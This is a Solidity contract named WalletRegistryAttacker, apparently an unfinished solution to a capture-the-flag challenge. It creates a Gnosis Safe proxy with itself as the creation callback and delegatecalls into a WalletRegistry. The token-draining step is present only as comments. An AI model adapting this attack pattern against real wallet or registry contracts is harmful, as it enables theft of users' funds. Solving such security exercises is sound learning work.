// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solady/src/auth/Ownable.sol";
import "solady/src/utils/SafeTransferLib.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "hardhat/console.sol";

contract WalletRegistryAttacker {
  GnosisSafeProxyFactory public factory;
  address public walletRegistry;
  GnosisSafe public gnosisSafe;

  constructor(address _factory, address _walletRegistry) {
    factory = GnosisSafeProxyFactory(_factory);
    walletRegistry = _walletRegistry;
  }

  function createSafe(address _singleton, bytes memory initializer, uint256 saltNonce, IProxyCreationCallback callback) external {
    // Call the Gnosis Safe Proxy factory to create the safe, setup this contract as a module on the Safe
    factory.createProxyWithCallback(_singleton, initializer, saltNonce, callback);

    // Callback calls the WalletRegistry contract, tokens get transferred to the Safe

    // This contract transfers the tokens from the Gnosis Safe to the player address
  }

  function proxyCreated(GnosisSafeProxy proxy, address singleton, bytes calldata initializer, uint256) external {
      console.log("inside attacker callback");

      gnosisSafe = GnosisSafe(payable(proxy));

        walletRegistry.delegatecall(
            abi.encodeWithSignature("proxyCreated(address,address,bytes,uint256)", address(this), singleton, initializer, 1)
        );
  }

  function getStorageAt(uint256 offset, uint256 length) public view returns (bytes memory) {
    return gnosisSafe.getStorageAt(offset, length);
  } 

  function getThreshold() public view returns (uint256) {
    return gnosisSafe.getThreshold();
  }

  function getOwners() external view returns (address[] memory) {
    return gnosisSafe.getOwners();
  }
}